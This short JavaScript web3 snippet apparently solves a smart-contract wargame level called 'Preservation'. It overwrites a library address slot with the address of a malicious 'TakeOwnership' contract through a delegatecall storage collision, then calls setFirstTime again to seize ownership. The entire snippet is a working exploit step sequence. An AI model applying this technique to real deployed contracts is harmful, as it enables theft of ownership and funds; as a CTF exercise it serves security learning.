const takeOwnershipAddress = "0xFA4B7caFD1375B715A03B8fD37Ed2d8f5f30E596";

// Convert TakeOwnership's address to a uint
const takeOwnershipAddressToUint = web3.utils.hexToNumberString(takeOwnershipAddress);

// Change timeZone1Library to takeOwnership's address
await contract.setFirstTime(takeOwnershipAddressToUint);

// Now that timeZone1Library points to our malicious contract
// we call setFirstTime again with an arbitrary value.
// Our malicious contract will take care of assigning us as the owner of Preserve.
await contract.setFirstTime("123");